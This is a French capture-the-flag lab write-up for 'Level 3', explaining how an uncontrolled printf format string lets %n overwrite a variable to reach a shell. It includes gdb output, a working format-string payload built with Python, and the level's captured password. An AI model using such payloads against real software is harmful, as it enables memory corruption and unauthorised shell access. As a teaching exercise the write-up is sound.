# Level 3

En décompilant le binaire on peut voir qu'il y a un call à la fonction `system` avec pour argument `/bin/sh` mais qu'elle n'est appelée que si la variable `m` (à l'adresse `0x804988c`) est égale à 64.  
Le binaire utilise ici la fonction `fgets`, qui est protégée contre les buffers overflow. Ce que récupère `fgets` devient le premier argument de la fonction `printf`. Mais l'appel à `printf` est mal codé : il aurait fallu écrire `printf("%s", buffer)`, et non `printf(buffer)`.  
La [page de manuel](https://linux.die.net/man/3/printf) de `printf` nous donne une piste :
    > Code such as `printf(foo)`; often indicates a bug, since `foo` may contain a `%` character. If `foo` comes from untrusted user input, it may contain `%n`, causing the `printf()` call to write to memory and creating a security hole. 
Il faudra donc exploiter cette [faille de `printf`](https://en.wikipedia.org/wiki/Uncontrolled_format_string) pour écraser la valeur de la variable `m` et la remplacer par 64. [Voir aussi ce PDF pour plus de détails](http://julianor.tripod.com/bc/formatstring-1.2.pdf)

`printf` à une option `%n` qui permet d'écrire le nombre de caractère affiché à l'adresse d'une variable, et ainsi écrire la valeur `64` à `m`

```shell
~ gdb level3
(gdb) disas v
Dump of assembler code for function v:
[...]
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
[...]
End of assembler dump.
(gdb) quit
~ ./level3
BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
~ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/level3
~ cat /tmp/level3 - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```